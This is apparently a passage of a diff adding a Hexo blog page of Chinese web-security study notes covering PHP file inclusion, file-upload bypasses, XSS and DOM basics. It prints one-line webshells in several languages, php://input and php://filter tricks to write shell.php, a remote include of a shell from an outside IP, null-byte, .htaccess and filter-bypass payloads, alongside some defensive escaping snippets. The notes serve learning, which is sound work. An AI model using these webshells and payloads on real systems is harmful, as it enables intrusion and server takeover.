+<li><h4 id="配合session"><a href="#配合session" class="headerlink" title="配合session"></a>配合session</h4></li>
+<li><h4 id="利用php协议进行文件包含"><a href="#利用php协议进行文件包含" class="headerlink" title="利用php协议进行文件包含"></a>利用php协议进行文件包含</h4><ul>
+<li><h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4>？参数&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;1223.ini有时候会过滤..&#x2F;</li>
+</ul>
+<p>&#x3D;&#x3D;讲解是此时远程上传的那两个命令可以都是观的？这不是本地吗？&#x3D;&#x3D;</p>
+<ul>
+<li><h4 id="php-filter-这里面的php会被编译所以给源码不执行，"><a href="#php-filter-这里面的php会被编译所以给源码不执行，" class="headerlink" title="php:&#x2F;&#x2F;filter 这里面的php会被编译所以给源码不执行，"></a>php:&#x2F;&#x2F;filter 这里面的php会被编译所以给源码不执行，</h4><ul>
+<li><p>读取php:&#x2F;&#x2F;filter&#x2F;read或者write&#x3D;或者省略convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+</li>
+<li><p>改写，四个字符一组解码，大小写，0-9+&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;&lt;?php exit;?&gt;&#x27;//exit后边不执行</span><br><span class="line">$a.=$_post[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($post[filename],$a);</span><br></pre></td></tr></table></figure>
+
+<p>post传参为test&#x3D;b后边是木马编码</p>
+<p>1、&amp;file&#x3D;php：&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>2、&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|cnvert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>这个会去除html和php标签的内容，然后对想要的进行解码</p>
+</li>
+</ul>
+<p><code>php://filter</code> 本身&#x3D;&#x3D;不会直接导致回显，&#x3D;&#x3D;它只是一个数据流的过滤器。回显（echo）是指将数据输出到浏览器或其他输出设备。如果你想要在应用了 <code>php://filter</code> 过滤器之后回显数据，你需要显式地使用 <code>echo</code> 或其他输出函数来输出处理后的数据。</p>
+</li>
+<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><ul>
+<li><p>接收post数据，作为php代码</p>
+</li>
+<li><pre><code>用hackbar
+url：http://192.168.1.1/?参数=php://input
+在post中输入&lt;?php fputs(fopen(&quot;shell.php&quot;,&#39;w&#39;),&lt;?php eval(\$_post[&#39;cmd&#39;]);?&gt;) 
+前提是
+allow_url_fopen=off 
+allow_url_include=on
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ #### zip://,bzip2://,zlib://</span><br><span class="line"></span><br><span class="line">  + 可以访问压缩文件里面的子文件</span><br><span class="line"></span><br><span class="line">  + off也可</span><br><span class="line"></span><br><span class="line">  + ```</span><br><span class="line">    http://192.168.1.1/?参数=zip://D:\phpstudy\teat。zip%23test.php</span><br><span class="line">    %23是#必须绝对路径#目标文件</span><br><span class="line">    大多不是上传jpg嘛，可以把zip后缀改成jpg</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><ul>
+<li>类似于zip，可以绝对可以相对</li>
+<li>off也可</li>
+<li>上传一个zip，可以后缀改成jpg，可能返回一个路径，在上传一个参数为phar:&#x2F;&#x2F;..&#x2F;..&#x2F;abc.jpg&#x2F;test.php</li>
+</ul>
+</li>
+<li><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><ul>
+<li>将原本的include的文件流重定向到用户可控制的输入流中，双on的情况下才可以使用</li>
+<li>参数&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()&#x2F;&#x2F;就是说直接就是文件内容，用逗号隔开</li>
+<li>参数&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,编码内容&#x2F;&#x2F;分号和逗号都看看在哪，意味着读取的时候会先进行base64编码00</li>
+</ul>
+</li>
+<li><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h4></li>
+<li><h4 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h4></li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="本地文件"><a href="#本地文件" class="headerlink" title="本地文件"></a>本地文件</h3><h4 id="某文件下用"><a href="#某文件下用" class="headerlink" title="某文件下用..&#x2F;"></a>某文件下用..&#x2F;</h4><h4 id="0截断"><a href="#0截断" class="headerlink" title="%0截断"></a>%0截断</h4><p>前提是maic_quotes_gps&#x3D;off且php版本&lt;5.3.4</p>
+<h4 id="路径长度截断，后面的字符穿就会被丢弃"><a href="#路径长度截断，后面的字符穿就会被丢弃" class="headerlink" title="路径长度截断，后面的字符穿就会被丢弃"></a>路径长度截断，后面的字符穿就会被丢弃</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#！php</span><br><span class="line">&lt;?php include(&quot;inc/&quot;.$_GET[&#x27;file&#x27;].&quot;htm&quot;);?&gt;</span><br><span class="line">1、？file=../../phpinfo.php%00</span><br><span class="line">2、（Linux）？file=../../phpinfo.php%。/。/。/。/。/。/。</span><br><span class="line">3、（Windows）？file=../../phpinfo.php%00..................</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;]</span><br><span class="line">require_once $a.&quot;/action_share.php&quot;</span><br><span class="line">?参数=http://196.128.1.1/shell.php?或者#，让后面成为参数或者注释掉</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/2%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cm1zupb1m000bqcasdyvj1jq2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/15文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/15%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.310Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><p>特洛伊木马，寄宿在计算机了，非授权，远程控制程序，在计算机管理员我i发觉的情况下，开放系统权限给攻击者</p>
+<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><p>一台计算机上有65535个端口，端口是计算机与外界连接的门，每个门都提供一些服务，利用这些服务，获得权限，给自己进入计算机里下一个后门</p>
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>asp php jsp cgj等网页文件形式存在的，一种命令执行环境，也叫网页木马后门，利用这个后门获得权限</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="文件大小分"><a href="#文件大小分" class="headerlink" title="文件大小分"></a>文件大小分</h4><ul>
+<li>一句话木马</li>
+<li>小马，只包含文件上传功能，体积小</li>
+<li>大马，体积大，包含多功能，代码通常会加密隐藏</li>
+</ul>
+<h4 id="脚本类型分"><a href="#脚本类型分" class="headerlink" title="脚本类型分"></a>脚本类型分</h4><ul>
+<li>jsp</li>
+<li>asp</li>
+<li>aspx</li>
+<li>php</li>
+</ul>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
+<li>动态脚本形式出现</li>
+<li>穿越服务器防火墙，攻击者和服务器都是通过80端口传递</li>
+<li>&#x3D;&#x3D;一般不会在系统日志留下记录，在web日志留下记录&#x3D;&#x3D;</li>
+</ul>
+<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ul>
+<li>sql注入，文件上传，</li>
+<li>获取权力</li>
+</ul>
+<h2 id="常见代码"><a href="#常见代码" class="headerlink" title="常见代码"></a>常见代码</h2><ul>
+<li>php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span><span class="comment">//GET可以换成post</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>小马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(“up,php”,w),’&lt;?php eval($_POST[‘cmd’]?&gt;))//写入一个文件</span><br></pre></td></tr></table></figure>
+
+<p><code>fputs</code> 是 PHP 中的一个函数，用于将字符串写入文件。如果文件不存在，<code>fputs</code> 会尝试创建它。如果文件已经存在，<code>fputs</code> 会向文件末尾追加内容，除非指定了其他模式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(base64_decode(shell.php的base64编码，怕被过滤)，w),base64_decode(base64_decode(php代码的两次base64编码，因为等号也会不被允许，不被url还是怎么着不知道哇)))	</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>小马变大马</p>
+</li>
+</ul>
+<p>​		上传一个写入一个新文件的 ，要进行上传文件的小马，用那个上传文件上传大马</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">fputs</span> ( resource <span class="variable">$handle</span> , <span class="keyword">string</span> <span class="variable">$string</span> [, <span class="keyword">int</span> <span class="variable">$length</span> ] )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>$handle</code> 是一个有效的文件指针资源，通常通过 <code>fopen</code> 函数获得。</li>
+<li><code>$string</code> 是要写入文件的字符串。</li>
+<li><code>$length</code> 是可选参数，指定要写入的最大字节数。如果省略此参数，将写入整个字符串。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li><p>成功时返回写入的字节数，失败时返回 <code>false</code>。</p>
+</li>
+<li><p>asp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&#x27;pass&#x27;)%&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>aspx</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@Pace Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&#x27;pass&#x27;]%)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>jsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime getRuntime().exec(request getparameter(&quot;i&quot;));%&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
+<li><p>是个可执行的脚本</p>
+</li>
+<li><p>$_get 啥的能够让我上传点东西</p>
+</li>
+<li><p>能让我执行上传的东西</p>
+<ul>
+<li><p>直接执行（eval  system  passthru）</p>
+</li>
+<li><p>文件包含执行（include require）</p>
+</li>
+<li><p>动态函数执行（$a&#x3D;“phpinfo”;$a();)</p>
+</li>
+<li><p>回调函数（array_map）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h1><p>客户端数据以文件形式封装，发送到服务器，服务器解释数据，最终在服务点硬盘上作为真实文件保存</p>
+<h1 id="文件上传的检测方式"><a href="#文件上传的检测方式" class="headerlink" title="文件上传的检测方式"></a>文件上传的检测方式</h1><ul>
+<li><p>文件扩展名，客户端js检测，前端</p>
+</li>
+<li><p>content-type 服务端MIME类型检测</p>
+</li>
+<li><p>path 服务端目录路径检测，上传到哪里</p>
+</li>
+<li><p>服务端文件扩展名检测，跟文件extension相关</p>
+</li>
+<li><p>服务端文件内容检测（检查内容是否含有恶意代码</p>
+</li>
+<li><p>客户端JS检测则是指在用户的浏览器上运行的JavaScript代码对文件上传进行的初步检查。例如，JavaScript可能会验证用户选择的文件扩展名是否在允许的列表中，或者文件大小是否超出限制。</p>
+<p>服务端和客户端检测的主要区别在于它们运行的位置和目的。服务端检测是后端代码的一部分，它在服务器上执行，可以提供更安全的验证，因为不受客户端环境的影响。客户端检测则是在用户的设备上执行，通常用于提高用户体验，通过即时反馈减少不必要的服务器请求。</p>
+</li>
+</ul>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h6 id="绕过客户端检测"><a href="#绕过客户端检测" class="headerlink" title="绕过客户端检测"></a>绕过客户端检测</h6><ul>
+<li>禁用js，火狐的noscript插件，有时候直接删除</li>
+<li>用bp抓包并没有抓到还报错，那就是前端报错</li>
+<li>把。php换成png然后抓包，就可以绕过了</li>
+</ul>
+<h5 id="绕过服务端"><a href="#绕过服务端" class="headerlink" title="绕过服务端"></a>绕过服务端</h5><ul>
+<li><p>content-type的mime值改就行</p>
+</li>
+<li><p>后缀检测</p>
+<ul>
+<li><p>黑名单</p>
+<ul>
+<li><p>大小写绕过Php</p>
+</li>
+<li><p>空格绕过.php最后加一个空格</p>
+</li>
+<li><p>点绕过，.php.最后加一个点</p>
+</li>
+<li><p>：$DATAwindows里面适合</p>
+</li>
+<li><p>apache的解析漏洞，解析文件时从右往左，如aa.php.owf.rar  apache不能识别rar和owf就会解析成php文件</p>
+</li>
+<li><p>htaccess文件<br>分布式配置文件，hypertext access超文本入口，提供针对目录改变配置的方法，<br>即在一个特定的文档目录中放置一个包含一个或者多个指令的文件，以此作用与这个目录和他的所以子目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">新建一个htaccess文件</span><br><span class="line">&lt;FileMatch&quot;aaab&quot;&gt;//文件匹配</span><br><span class="line">SetHandler application/x-httpd-php//表示匹配到这个文件后当作php文件来处理，不论是什么文件，只要包含这个字符串，就会被当作php来处理</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>白名单</p>
+<p>服务端判断文件类型从后往前，解析从前往后shell.php%00png<br>&#x2F;&#x2F;解析会是png，保存会解码从前往后截断，%00是个url编码</p>
+</li>
+</ul>
+</li>
+<li><p>文件内容</p>
+<ul>
+<li><p>文件格式幻数magic number，用来标记文件或者协议的格式，前十个字节，就是winhex打开，前几个字，</p>
+</li>
+<li><p>文件加载检测，调用服务器的api对文件进行加载，渲染，打乱编码但仍然显示图片，甚至有二次渲染<br>对渲染&#x2F;加载测试的攻击方式就是代码注入绕过</p>
+<p>对二次渲染的攻击方式是攻击文件加载器自身，二次渲染会把属于图片的抓出来，非图片部分会被直接隔离开<br>溢出攻击对文件加载器进行攻击，上传自己的文件后，文件加载器会主动加载测试，测试时进行溢出攻击执行shellcode</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="还有web解析漏洞"><a href="#还有web解析漏洞" class="headerlink" title="还有web解析漏洞"></a>还有web解析漏洞</h5><p>知道是哪个服务器再去找吧，不想看了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/15%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cm1zupb1l0009qcas7l8f2fqz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/14xss" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/14xss/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.309Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>cross-site scripting.跨站脚本攻击，</p>
+<p>通过网站注入点，注入客户端可执行的payload（脚本代码</p>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>获取用户信息，浏览器，IP，cookie等</p>
+<p>钓鱼，欺骗用户登录过期，骗取账号密码，自己先输入一个，跳转到你输入的页面，发给受害者</p>
+<p>注入木马，广告链接</p>
+<p>后台删改数据，配合ssrf</p>
+<p>xss蠕虫，看过帖子就关注</p>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>钓鱼，引流，配合其他漏洞如csrf等</p>
+<p>仅执行一次，参数型跨站脚本</p>
+<p>主要是将攻击脚本放到url中</p>
+<h5 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h5><p>见框就插，改url参数，</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><ul>
+<li><p>经典测试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘hacke’)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//防范</span><br><span class="line">php中get或者post之后</span><br><span class="line">$name=str_replace(&#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span>&#x27;,&quot;&quot;,$name)//str_replace替换函数，区分大小写，但后边两个都能绕过</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>大写绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hacker&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>双写绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;hacker&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">//防范</span><br><span class="line">$name=str_replace(&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;,&#x27;&#x27;,$name)//i是忽略大小写</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">hacker</span>&#x27;)/&gt;</span></span><br><span class="line">传一个图片链接，路径为1，他是找不到的，故报错，令报错=弹窗</span><br><span class="line">//防御</span><br><span class="line">$name=htmlspecialchars($name);把预定义的字符<span class="tag">&lt;&gt;</span>&amp;、转化为html实体，防止浏览器将他作为html元素</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索框的一个例子<br>往搜索框里面输入东西，源代码显示value&#x3D;“mann”onclick&#x3D;prompt(1)””&#x2F;&#x2F;两个分号前面闭合前面后面闭合后面<br>prompt是与用户交互对话框，1是它提示信息</p>
+</li>
+<li><p>直接闭合标签”&gt;&lt;”img src&#x3D;“123” onerror&#x3D;eval()</p>
+</li>
+</ul>
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>攻击范围广，流量传播的，可配合其他漏洞</p>
+<p>持久型</p>
+<p>将恶意脚本存储于数据库中，用户访问包含恶意相关数据的页面</p>
+<p>多数存在评论，个人信息等地，因为这些才需要数据库的存在</p>
+<p>防御</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name=strip_tags(addslashes($name));//加上反斜杠和去除里面的php html xml标签，是去掉一整个从《到&gt;</span><br><span class="line">或者</span><br><span class="line">$name=htmlspecialchars($name)搞成html实体</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h3><p>配合，长度大小不受限制，通过js操作document，实现dom树的重构</p>
+<p>主要存在用户能修改页面的dom，造成客户端payload在浏览器中执行</p>
+<p>全是前端，客户端，跟后端毫无关系</p>
+<h1 id="绕过和防御"><a href="#绕过和防御" class="headerlink" title="绕过和防御"></a>绕过和防御</h1><ul>
+<li><p>&lt;&gt;被过滤</p>
+<p>比如你的输入在标签里面，比如input，就会在value里面，可以闭合前面的双引号“autofocus onfocus&#x3D;alert(1)&#x2F;&#x2F;就是启动就会自动聚焦到这个命令这里</p>
+</li>
+<li><p>alert被过滤</p>
+<p>prompt、confire也会进行一个弹窗<br>&lt;a href&#x3D;data:text&#x2F;html;base64,弹窗命令的base64编码，firefox可以chrome不行</p>
+</li>
+<li><p>on被过滤</p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/14xss/" data-id="cm1zupb1l0008qcas5rr1h9bw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/13bom" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/13bom/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.308Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/13bom/" data-id="cm1zupb1k0007qcas091rbfkf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-top10/12dom" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/12dom/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.307Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="dom"><a href="#dom" class="headerlink" title="dom"></a>dom</h1><p>document object model文档对象模型</p>
+<p>访问和操作html文档的标准方法</p>
+<p>通过利用js访问，操作html。</p>
+<ul>
+<li><p>获取html标签内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>123<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">name</span>&gt;</span>javascrip<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">typt</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>)<span class="comment">//文档的函数获取元素by id=name</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;id为name的呢容是&quot;</span>+x.<span class="property">innerHTML</span>)<span class="comment">//以弹窗显示，标签已经在x那里了，取出里面的内容</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改html</p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>123<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">name</span>&gt;</span>javascrip<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    	x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;name&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        x.<span class="property">innerHTML</span>=<span class="string">&quot;JACA&quot;</span><span class="comment">//直接赋值替换</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/12dom/" data-id="cm1zupb1k0005qcas03kj7ubm" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%88%91%E6%9C%8D%E4%BA%86%EF%BC%8C%E5%88%B0%E5%BA%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89css/" rel="tag">我服了，到底为什么没有css</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
